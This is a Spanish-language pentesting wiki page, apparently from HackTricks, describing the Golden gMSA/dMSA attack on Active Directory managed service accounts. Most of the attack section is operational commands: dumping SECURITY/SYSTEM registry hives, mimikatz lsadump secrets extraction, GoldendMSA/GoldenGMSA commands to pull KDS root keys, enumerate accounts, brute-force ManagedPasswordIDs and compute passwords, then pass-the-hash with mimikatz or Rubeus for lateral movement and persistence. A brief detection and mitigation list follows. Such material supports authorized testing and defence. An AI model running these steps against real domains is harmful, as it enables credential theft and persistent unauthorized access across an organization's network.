# Golden gMSA/dMSA Attack (Derivación Offline de Contraseñas de Cuentas de Servicio Administradas)

{{#include ../../banners/hacktricks-training.md}}

## Resumen

Las Cuentas de Servicio Administradas de Windows (MSA) son principios especiales diseñados para ejecutar servicios sin la necesidad de gestionar manualmente sus contraseñas.
Hay dos variantes principales:

1. **gMSA** – cuenta de servicio administrada por grupo – puede ser utilizada en múltiples hosts que están autorizados en su atributo `msDS-GroupMSAMembership`.
2. **dMSA** – cuenta de servicio administrada delegada – el sucesor (en vista previa) de gMSA, que se basa en la misma criptografía pero permite escenarios de delegación más granulares.

Para ambas variantes, la **contraseña no se almacena** en cada Controlador de Dominio (DC) como un hash NT regular. En su lugar, cada DC puede **derivar** la contraseña actual sobre la marcha a partir de:

* La **Clave Raíz KDS** a nivel de bosque (`KRBTGT\KDS`) – secreto nombrado GUID generado aleatoriamente, replicado a cada DC bajo el contenedor `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* El **SID** de la cuenta objetivo.
* Un **ManagedPasswordID** (GUID) por cuenta encontrado en el atributo `msDS-ManagedPasswordId`.

La derivación es: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 bytes finalmente **codificado en base64** y almacenado en el atributo `msDS-ManagedPassword`.
No se requiere tráfico de Kerberos ni interacción con el dominio durante el uso normal de la contraseña: un host miembro deriva la contraseña localmente siempre que conozca las tres entradas.

## Ataque Golden gMSA / Golden dMSA

Si un atacante puede obtener las tres entradas **offline**, puede calcular **contraseñas válidas actuales y futuras** para **cualquier gMSA/dMSA en el bosque** sin tocar el DC nuevamente, eludiendo:

* Auditoría de lectura LDAP
* Intervalos de cambio de contraseña (pueden pre-calcular)

Esto es análogo a un *Golden Ticket* para cuentas de servicio.

### Requisitos Previos

1. **Compromiso a nivel de bosque** de **un DC** (o Administrador de Empresa), o acceso `SYSTEM` a uno de los DC en el bosque.
2. Capacidad para enumerar cuentas de servicio (lectura LDAP / fuerza bruta RID).
3. Estación de trabajo .NET ≥ 4.7.2 x64 para ejecutar [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) o código equivalente.

### Golden gMSA / dMSA
#### Fase 1 – Extraer la Clave Raíz KDS

Volcar desde cualquier DC (Copia de Sombra de Volumen / registros SAM+SECURITY en bruto o secretos remotos):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
La cadena base64 etiquetada como `RootKey` (nombre GUID) es necesaria en pasos posteriores.

##### Fase 2 – Enumerar objetos gMSA / dMSA

Recuperar al menos `sAMAccountName`, `objectSid` y `msDS-ManagedPasswordId`:
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementa modos de ayuda:
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Fase 3 – Adivinar / Descubrir el ManagedPasswordID (cuando falta)

Algunas implementaciones *eliminan* `msDS-ManagedPasswordId` de lecturas protegidas por ACL.  
Debido a que el GUID es de 128 bits, el ataque de fuerza bruta ingenuo es inviable, pero:

1. Los primeros **32 bits = tiempo de época Unix** de la creación de la cuenta (resolución en minutos).  
2. Seguidos de 96 bits aleatorios.

Por lo tanto, una **lista de palabras estrecha por cuenta** (± unas pocas horas) es realista.
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
La herramienta calcula contraseñas candidatas y compara su blob base64 con el atributo real `msDS-ManagedPassword` – la coincidencia revela el GUID correcto.

##### Fase 4 – Cálculo y Conversión de Contraseña Offline

Una vez que se conoce el ManagedPasswordID, la contraseña válida está a un comando de distancia:
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
Los hashes resultantes pueden ser inyectados con **mimikatz** (`sekurlsa::pth`) o **Rubeus** para el abuso de Kerberos, lo que permite un **movimiento lateral** sigiloso y **persistencia**.

## Detección y Mitigación

* Restringir las capacidades de **copia de seguridad de DC y lectura de la colmena del registro** a administradores de Nivel-0.
* Monitorear la creación de **Modo de Restauración de Servicios de Directorio (DSRM)** o **Copia de Sombra de Volumen** en los DCs.
* Auditar lecturas / cambios a `CN=Master Root Keys,…` y los flags `userAccountControl` de cuentas de servicio.
* Detectar inusuales **escrituras de contraseñas en base64** o reutilización repentina de contraseñas de servicio entre hosts.
* Considerar convertir gMSAs de alto privilegio a **cuentas de servicio clásicas** con rotaciones aleatorias regulares donde no sea posible el aislamiento de Nivel-0.

## Herramientas

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implementación de referencia utilizada en esta página.
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – implementación de referencia utilizada en esta página.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket usando claves AES derivadas.

## Referencias

- [Golden dMSA – bypass de autenticación para cuentas de servicio administradas delegadas](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Cuentas de ataques de Active Directory gMSA](https://www.semperis.com/blog/golden-gmsa-attack/)
- [Repositorio de GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – ataque de confianza Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
